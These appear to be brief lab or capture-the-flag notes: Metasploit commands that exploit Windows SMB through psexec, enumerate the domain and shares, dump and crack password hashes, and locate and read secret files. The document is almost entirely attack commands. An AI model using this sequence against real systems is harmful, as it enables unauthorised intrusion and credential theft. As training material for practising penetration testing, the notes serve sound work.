```
search exploit/windows/smb
use exploit/windows/smb/psexec
```
Set necessary parameters
```
exploit
sysinfo
background (background the session)
search post/windows/gather
use post/windows/gather/enum_domain
set session 1
run
sessions -i 1  (To use previous session)
run post/windows/gather/enum_shares
hashdump (cracked the hash of required user's password using crackstation)
search -f secret.txt
cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
search -f realsecret.txt
cat "c:\inetpub\wwwroot\realsecret.txt"
```